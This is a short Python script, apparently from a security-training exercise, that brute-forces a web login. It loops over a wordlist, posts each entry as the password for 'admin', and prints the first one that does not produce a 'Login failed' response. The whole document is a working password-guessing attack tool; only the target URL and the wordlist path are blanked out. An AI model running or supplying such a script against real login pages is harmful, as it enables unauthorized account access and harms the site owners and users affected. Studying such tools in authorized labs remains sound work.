#!/usr/bin/env python

import requests

# Target URL to send POST requests
target_url = "http://.........."
# Dictionary containing login credentials
data_dict = {"username": "admin", "password": "password", "Login": "submit"}

# Open the wordlist file for reading
with open("/root/Download/......", "r") as wordlist_file:
    # Iterate through each line in the wordlist file
    for line in wordlist_file:
        # Remove leading and trailing whitespaces from the line
        word = line.strip()
        # Update the password field in the data dictionary with the current word
        data_dict["password"] = word
        # Send a POST request with the updated data dictionary
        response = requests.post(target_url, data=data_dict)
        # Check if the response contains "Login failed"
        if "Login failed" not in response.content:
            # If "Login failed" is not present, print the password and exit the loop
            print("[+] Got the password >> " + word)
            exit()

# If no password is found in the wordlist, print a message
print("[+] Reached end of the line.")

